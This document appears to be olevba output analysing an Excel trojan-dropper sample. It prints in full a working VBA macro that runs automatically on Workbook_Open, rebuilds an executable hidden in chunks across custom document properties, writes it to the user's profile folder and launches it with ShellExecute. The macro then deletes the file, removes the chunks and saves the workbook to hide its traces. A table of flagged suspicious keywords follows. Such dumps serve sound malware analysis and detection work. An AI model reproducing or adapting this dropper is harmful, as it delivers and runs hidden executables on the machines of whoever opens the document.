olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Trojan-Dropper.MSExcel.Chunks.a-2cd2c6051ec611914e6c60ff256129b5eabd8506336511e07b1223d5569db664
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Trojan-Dropper.MSExcel.Chunks.a-2cd2c6051ec611914e6c60ff256129b5eabd8506336511e07b1223d5569db664 
in file: Trojan-Dropper.MSExcel.Chunks.a-2cd2c6051ec611914e6c60ff256129b5eabd8506336511e07b1223d5569db664 - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Const SW_SHOWMAXIMIZED = 3

Private Declare Function ShellExecute Lib "Shell32.dll" Alias "ShellExecuteA" _
  (ByVal hwnd As Long, _
   ByVal lpOperation As String, _
   ByVal lpFile As String, _
   ByVal lpParameters As String, _
   ByVal lpDirectory As String, _
   ByVal nShowCmd As Long) As Long
   
 


Public Function SearchProperty(cp As DocumentProperties, name As String) As Integer
' Linear searches: if it performs really bad i'll fix it
    Dim i As Integer
    Dim found As Boolean
    
    i = 1
    found = False
    
    Do While i <= cp.Count And Not found
        If StrComp(cp.Item(i).name, name) = 0 Then
           found = True
        Else
            i = i + 1
        End If
   Loop
   
   If Not found Then
    i = -1
   End If
    
   
   SearchProperty = i
   
End Function

Public Function FileExists(name As String) As Boolean
    Dim fso
        
    Set fso = CreateObject("Scripting.FileSystemObject")
    If Not fso.FileExists(name) Then
        FileExists = False
    Else
        FileExists = True
    End If
End Function


Private Sub Workbook_Open()
    Dim nChunks As Integer
    Dim idx As Integer
    Dim i As Long
    Dim cp As DocumentProperties
    Dim code As String
    Dim codeOut As String
    Dim retVal As Long
    Dim outfile As String
    Dim tmpName As String
    
    
    code = ""
    Set cp = ThisWorkbook.CustomDocumentProperties
    
    ' Get the number of chunks
    idx = SearchProperty(cp, "ag0")
    If idx = -1 Then
        GoTo finish
    End If
    nChunks = CInt(cp.Item(idx).Value)
    
    ' Read each chunk
    For i = 1 To nChunks
        idx = SearchProperty(cp, "ag" + CStr(i))
        If idx = -1 Then
            GoTo finish
        End If
        code = code + cp.Item(idx).Value
    Next
    
   ' Un-escape chars
   i = 1
   codeOut = ""
   Do While i <= Len(code)
    If Mid$(code, i, 1) = Chr(1) Then
        If Mid$(code, i + 1, 1) = Chr(1) Then
            codeOut = codeOut + Chr(1)
            i = i + 1
        ElseIf Mid$(code, i + 1, 1) = Chr(2) Then
            codeOut = codeOut + Chr(0)
            i = i + 1
        End If
    Else
        codeOut = codeOut + Mid$(code, i, 1)
    End If
    i = i + 1
   Loop

    On Error Resume Next
    ' Write the exe
    i = 0
    outfile = Environ("USERPROFILE") + "\PXGMZREU"
    tmpName = outfile + ".exe"
    Do While FileExists(tmpName)
        tmpName = outfile + CStr(i) + ".exe"
        i = i + 1
    Loop
    outfile = tmpName
    
    Open outfile For Binary Access Write As #1
    Put #1, 1, codeOut
    Close #1
    
    ' execute it
    retVal = ShellExecute(0, "open", outfile, "", Environ("USERPROFILE"), SW_SHOWMAXIMIZED)
    
    ' Delete it
    SetAttr outfile, vbNormal
    Kill outfile
    
    ' clean ourselves
    For i = 0 To nChunks
        idx = SearchProperty(cp, "ag" + CStr(i))
        If idx <> -1 Then
            cp.Item(idx).Delete
        End If
    Next
    
    ThisWorkbook.Save
    
    
    
        
    
finish:
        
End Sub










+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|ShellExecute        |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|ShellExecuteA       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Shell32             |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Shell32.dll         |Executable file name                         |
+----------+--------------------+---------------------------------------------+

